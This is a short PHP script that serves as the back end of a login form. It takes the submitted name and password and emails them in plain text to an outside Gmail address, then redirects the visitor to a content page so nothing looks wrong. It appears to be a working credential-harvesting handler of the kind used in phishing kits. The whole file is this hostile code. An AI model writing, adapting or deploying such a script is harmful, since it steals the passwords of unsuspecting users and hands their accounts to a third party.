<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $password = htmlspecialchars($_POST['password']);
    $to = "hallo.titty2@gmail.com";
    $subject = "Login Form Submission";
    $message = "Name: " . $name . "\nPassword: " . $password;
    $headers = "From: your-email@example.com"; // Replace with a valid sender email

    if (mail($to, $subject, $message, $headers)) {
        // Redirect to content.html after email is sent
        header("Location: content.html");
        exit();
    } else {
        echo "There was an error sending the email.";
    }
}
?>
